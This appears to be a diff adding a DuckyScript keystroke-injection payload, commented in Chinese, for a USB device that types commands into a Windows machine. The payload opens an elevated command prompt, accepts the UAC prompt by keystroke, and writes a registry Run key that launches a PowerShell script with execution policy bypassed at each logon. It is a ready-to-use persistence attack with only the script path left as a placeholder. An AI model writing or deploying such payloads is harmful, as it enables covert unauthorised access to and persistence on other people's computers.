@@ -1,0 +1,19 @@
+REM 开始延迟，确保系统准备就绪
+DELAY 1000
+REM 打开运行对话框
+GUI r
+DELAY 500
+REM 输入打开命令提示符的命令，使用CTRL+SHIFT+ENTER以管理员身份运行
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1000
+REM 在UAC提示时按左箭头和回车键选择“是”，这假设默认选项是“否”
+ALT y
+DELAY 1000
+REM 添加注册表项，使脚本在启动时运行
+STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyStartupScript /d "powershell.exe -ExecutionPolicy Bypass -File \"C:\\Path\\To\\YourScript.ps1\""
+ENTER
+DELAY 500
+REM 退出命令提示符
+STRING exit
+ENTER
